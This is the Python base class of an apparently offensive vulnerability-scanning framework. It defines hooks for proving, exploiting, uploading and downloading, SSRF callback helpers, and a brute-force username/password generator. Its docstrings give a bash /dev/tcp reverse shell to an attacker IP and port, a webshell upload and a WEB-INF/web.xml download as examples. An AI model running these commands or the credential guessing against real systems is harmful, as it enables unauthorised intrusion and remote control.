#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import os
import aiohttp
import urllib.parse
from lib.api.api import _ceye_dns_api
from lib.api.api import _ceye_verify_api
from lib.core.data import logger
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from lib.utils.connect import ClientSession


class Script(object):

    def __init__(self, target=None, service_type=SERVICE_PORT_MAP.WEB, priority=5):
        self.service_type = service_type
        self.name = 'Basic script'
        self.keyword = ['Basic script']
        self.info = 'Basic script'
        self.refer = 'Basic script'
        self.repair = 'Basic script'
        self.vul_type = VUL_TYPE.INFO
        self.vul_level = VUL_LEVEL.INFO

        self.target = target
        self.priority = priority
        self.parameter = {}
        self.url = self.base_url = None
        self.req = []
        self.res = []
        self.other = {}

    async def prove(self):
        """subclass should override this function for prove
            demo:
                if vul:
                    self.flag = 1
                    self.req.append({"test": test})                     # for recode the request' info to database
                    self.res.append({"info": test, "key": "test"})      # for recode the response' info to database and show info, key to console.
        """
        raise AttributeError('Function is not exist.')

    async def exec(self):
        """subclass should override this function for exec
            use self.parameter['cmd'] by -p cmd=whoami
            demo:
                res = os.system(self.parameter['cmd'])
                if vul:
                    self.flag = 1
                    self.req.append({"test": test})                      # for recode the request' info to database
                    self.res.append({"info": test, "key": "test"})       # for recode the response' info to database and show info, key to console.
        """
        raise AttributeError('Function is not exist.')

    async def upload(self):
        """subclass should override this function for upload
            use self.parameter['srcpath'] and self.parameter['despath'] by -p srcpath=webshell.jsp&despath=test.jsp
            demo:
                srcpath = self.parameter['srcpath']
                despath = self.parameter['despath']
                ... upload srcpath to despath...
                if vul:
                    self.flag = 1
                    self.req.append({"test": srcpath})                # for recode the request' info to database
                    self.res.append({"info": despath, "key": "test"}) # for recode the response' info to database and show info, key to console.
        """
        raise AttributeError('Function is not exist.')

    async def download(self):
        """subclass should override this function for upload
            use self.parameter['srcpath'] and self.parameter['despath'] by -p srcpath=WEB-INF/web.xml&despath=web.xml
            demo:
                srcpath = self.parameter['srcpath']
                despath = self.parameter['despath']
                ... upload srcpath to despath...
                if vul:
                    self.flag = 1
                    self.req.append({"test": srcpath})                # for recode the request' info to database
                    self.res.append({"info": despath, "key": "test"}) # for recode the response' info to database and show info, key to console.
        """
        raise AttributeError('Function is not exist.')

    async def rebound(self):
        """subclass should override this function for upload
            use self.parameter['local_host'] and self.parameter['local_port'] by -p local_host=192.168.1.3&local_port=4444
            demo:
                local_host = self.parameter['local_host']
                local_port = self.parameter['local_port']
                cmd = '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=local_host, port=local_port)
                res = os.system(cmd)
                if vul:
                    self.flag = 1
                    self.req.append({"test": cmd})                      # for recode the request' info to database
                    self.res.append({"info": 'success', "key": "test"}) # for recode the response' info to database and show info, key to console.
        """
        raise AttributeError('Function is not exist.')

    async def get_url(self):
        if self.url == None :
            async with ClientSession() as session:
                for pro in ['http://', "https://"]:
                    _port = self.target_port if self.target_port != None and self.target_port != 0 else 443 if pro == 'https' else 80
                    _pro = 'https://' if self.target_host == 443 else pro
                    url = _pro + self.target_host + ":" + str(_port) + '/'
                    try:
                        async with session.head(url) as response:
                            if response != None:
                                resp = str(await response.read())
                                if response.status == 400 and 'The plain HTTP request was sent to HTTPS port' in resp:
                                    continue
                                else:
                                    self.base_url = self.url = url
                                    return
                    except aiohttp.ClientConnectorSSLError:
                        pass
            # self.base_url = self.url = await geturl(self.target_host, self.target_port)

    def initialize(self,host, port, url, parameter):
        self.target_host = host
        self.target_port = port
        self.parameter = parameter
        if url != None and len(url) > 9:
            _ = url[9:].find('/')
            if _ == -1 :
                url += '/'
                self.base_url = self.url = url
            else:
                self.url = url
                self.base_url = self.url[:_ + 10]
        self.flag = -1
        self.req = []
        self.res = []
        self.other = {}


    def read_file(self, filename, type = 'r'):
        if os.path.isfile(filename):
            with open(filename, type) as f:
                return f.readlines()
        logger.error("File is not exist: %s" %filename)
        return None

    def ceye_dns_api(self, t='url'):
        '''
        curl ssrf
        :param t:
        :return:
        '''
        return _ceye_dns_api(t=t)

    def ceye_verify_api(self, filter, t='dns'):
        '''
        verify ssrf
        :param filter:
        :param t:
        :return:
        '''
        return _ceye_verify_api(filter=filter, t=t)

    def url_normpath(self, base, url):
        from urllib.parse import urljoin
        from urllib.parse import urlparse
        from urllib.parse import urlunparse
        from posixpath import normpath
        url1 = urljoin(base, url)
        arr = urlparse(url1)
        path = normpath(arr[2])
        if path[-1]!='/':
            path+='/'
        return urlunparse((arr.scheme, arr.netloc, path, arr.params, arr.query, arr.fragment))

    async def generate_dict(self, usernamedic, passworddic):
        usernamedic = list(set(usernamedic))
        passworddic = list(set(passworddic))
        for username in usernamedic:
            username = username.replace('\r', '').replace('\n', '').strip().rstrip()
            for password in passworddic:
                if '%user%' not in password:
                    password = password
                else:
                    password = password.replace("%user%", username)
                password = password.replace('\r', '').replace('\n', '').strip().rstrip()
                yield username, password

                # 首位大写也爆破下
                password2 = password[0].upper() + password[1:]
                if password2 != password:
                    yield username, password2



